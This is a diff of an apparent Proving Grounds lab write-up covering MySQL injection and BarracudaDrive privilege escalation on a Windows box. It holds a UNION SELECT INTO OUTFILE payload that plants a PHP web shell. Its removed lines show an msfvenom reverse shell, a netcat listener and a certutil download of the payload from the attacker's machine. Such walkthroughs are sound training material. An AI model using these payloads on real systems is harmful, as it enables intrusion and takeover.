@@ -471,14 +471,13 @@ We are regular users, with restricted access to sensitive data and restricted pr
 # Exploitation
 ## MYSQL Injection
 
-#### - Found mysql on the page so I typed one quote and clicked request to confirm if it might be vulnerable to sql injection:
-
+- When we find MySQL listed on the page, we decide to see if it was susceptible to SQL injection by typing a single quote and clicking "request".
+  
 ![](Images/Pasted%20image%2020221020191855.png)
 
 ![](Images/Pasted%20image%2020221020191917.png)
 
-#### - Received an error showing it was vulnerable and has sql database running:
-
+- We receive an error showing it is vulnerable and has a SQL database running.
 
 ![](Images/Pasted%20image%2020221020192000.png)
 #sqlinjection 
@@ -487,7 +486,8 @@ We are regular users, with restricted access to sensitive data and restricted pr
 
 ' UNION SELECT (“<?php echo passthru($_GET[‘cmd’]);”) INTO OUTFILE ‘C:/xampp/htdocs/cmd.php’ — -'
 
-![[Pasted image 20240501180757.png]]
+![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/ec9d665b-b507-4801-8bb5-a79683ac12b4)
+
 
 - We try to access "192.168.224.127:33033/cmd.php?cmd=whoami" in order to verify Remote Command Execution, but nothing comes up.
 
@@ -530,14 +530,13 @@ http://192.168.224.127:45332/cmd.php?cmd=rev.exe
 ## Privilege Escalation vector
 ## BarracudaDrive v6.5 Privilege Escalation 
 
-#### - Instead of creating an admin user via the compiled binary steps shown in the exploit I performed the following steps:
+- We navigate to the privilege escalation exploit webpage we found on Google previously.
 
-- Typed "msfvenom -p windows/x64/shell_reverse_tcp -f exe -o bd.exe LHOST=192.168.49.114 LPORT=45332" to create a reverse shell binary on my kali machine
-- Hosted the reverse shell binary on my Kali machine
-- Started a netcat listener on port 45332 listening on my kali machine
-- Typed "certutil.exe -urlcache -split -f "http://192.168.49.114:85/bd.exe" to download the reverse shell binary onto the target machine into the "C:\bd" directory to replace the already present bd.exe
-- Typed "shutdown -r" and waited a minute and received a reverse shell running as nt authority\system:
+- Rather than producing a malicious C code binary, we make use of the target machine’s existing rev.exe reverse shell binary.
 
-![](Images/Pasted%20image%2020221020193334.png)
+- To alter the name of the bd executable, we type the following command.
+
+![[Pasted image 20240502171349.png]]
+
 
 ---
